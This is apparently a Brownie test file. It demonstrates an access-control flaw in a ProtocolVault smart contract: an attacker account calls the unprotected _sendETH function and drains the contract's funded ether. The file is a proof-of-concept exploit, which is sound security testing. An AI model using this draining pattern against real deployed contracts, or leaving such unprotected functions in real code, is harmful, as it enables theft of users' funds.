from brownie import accounts, ProtocolVault
# Setting accounts

def test_access_control_1():

    [dep, attacker] = accounts[:2]

    #Instantiating a deployed instance of the contract
    ac1 = ProtocolVault.deploy({'from': dep})

    # Funding contract with deployers wallet
    dep.transfer(ac1.address, 10**18).wait(1)

    # Getting initial balance
    initialBal = attacker.balance()

    # Calling unprotected _sendETH function to drain contract balance
    ac1._sendETH(attacker.address, {'from': attacker}).wait(1)
    # Asserting new funds
    assert(attacker.balance() == initialBal+ 10**18)
